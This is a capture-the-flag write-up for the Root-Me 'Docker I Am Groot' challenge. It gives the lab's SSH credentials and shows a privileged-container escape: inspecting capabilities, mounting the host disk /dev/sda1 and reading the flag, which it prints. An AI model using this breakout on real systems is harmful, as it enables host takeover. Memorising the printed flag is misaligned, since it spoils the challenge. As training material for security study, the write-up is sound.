# Docker I Am Groot

URL: [https://www.root-me.org/en/Challenges/App-Script/Docker-I-am-groot?lang=en](https://www.root-me.org/en/Challenges/App-Script/Docker-I-am-groot?lang=en)
## Statement

One of the sysadmins deploys a docker machine as root and with privileges, he tells you it’s not important because as long as it’s in the container it’s secure :)

- Start the CTF-ATD "I am groot"  
- Log on to the machine docker using SSH on port 2222 (root / arq87TNDCf9NfksD)  
- Challenge validation password is in the file .passwd  
- CTF-ATD validation password is in the file /passwd
## Solution

[HackTricks > Docker Breakout / Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

_You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: `**CAP_SYS_ADMIN**`, `**CAP_SYS_PTRACE**`, `**CAP_SYS_MODULE**`, `**DAC_READ_SEARCH**`, `**DAC_OVERRIDE, CAP_SYS_RAWIO**`**,** `**CAP_SYSLOG**`**,** `**CAP_NET_RAW**`**,** `**CAP_NET_ADMIN**`_

```bash
root@h3yd0ck3r:~# capsh --print
WARNING: libcap needs an update (cap=40 should have a name).
Current: =ep 38,39,40-ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Ambient set =
Securebits: 00/0x0/1'b0                                 #'
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

We seem to own all the capabilities that allows for privilege escalation.

[HackTricks > Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

getcap doesn't return any binaries..
```bash
root@h3yd0ck3r:~# getcap -r / 2>/dev/null
```

Before proceeding with other capabilities I wanted to check if we were in privileged container, which in a nutshell means we have some access to host machine.

Common technique is to mount `/dev/sda?` to the docker container and get read/write access.

```bash
root@h3yd0ck3r:~# lsblk -a
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   20G  0 disk
|-sda1   8:1    0   19G  0 part /etc/hosts
|-sda2   8:2    0    1K  0 part
`-sda5   8:5    0  975M  0 part [SWAP]
root@h3yd0ck3r:~# mount /dev/sda1 /mnt
root@h3yd0ck3r:~# cd /mnt/
root@h3yd0ck3r:/mnt# ls
bin   dev  home        initrd.img.old  lib32  libx32      media  opt     proc  run   srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lib64  lost+found  mnt    passwd  root  sbin  sys  usr  vmlinuz
root@h3yd0ck3r:/mnt# cat .passwd # <-- Real passwd
b95d3d00d5336d16d7f27454ebe9cc58
```

::: tip Flag
`b95d3d00d5336d16d7f27454ebe9cc58`
:::

